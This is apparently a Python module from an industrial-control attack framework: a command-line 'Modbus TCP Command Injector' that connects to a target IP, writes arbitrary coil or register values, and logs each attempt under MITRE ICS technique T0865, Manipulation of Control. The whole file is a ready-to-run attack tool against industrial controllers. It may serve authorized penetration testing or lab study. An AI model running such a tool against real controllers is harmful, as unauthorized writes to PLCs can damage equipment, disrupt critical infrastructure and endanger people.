# modules/exploits/modbus_command_injector.py

import argparse
import json
import os
from datetime import datetime
from pymodbus.client.sync import ModbusTcpClient

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0865"  # Manipulation of Control

def log_modbus_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, 'r') as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, 'w') as f:
        json.dump(data, f, indent=2)

def inject_modbus(target_ip, function, address, value):
    client = ModbusTcpClient(target_ip)
    if not client.connect():
        print(f"[!] Could not connect to {target_ip}")
        return
    try:
        if function == "write_coil":
            result = client.write_coil(address, value)
        elif function == "write_register":
            result = client.write_register(address, value)
        else:
            print("[!] Unsupported function")
            return

        log_modbus_attack({
            "timestamp": datetime.utcnow().isoformat(),
            "target": target_ip,
            "function": function,
            "address": address,
            "value": value,
            "ttp": MITRE_TTP,
            "success": result.isError() is False
        })

        print(f"[âœ“] Sent {function}({address}, {value}) -> success={not result.isError()}")

    finally:
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus TCP Command Injector")
    parser.add_argument("--target", required=True, help="Target IP")
    parser.add_argument("--function", choices=["write_coil", "write_register"], required=True)
    parser.add_argument("--address", type=int, required=True, help="Coil/Register address")
    parser.add_argument("--value", type=int, required=True, help="Value to write")
    args = parser.parse_args()

    inject_modbus(args.target, args.function, args.address, args.value)
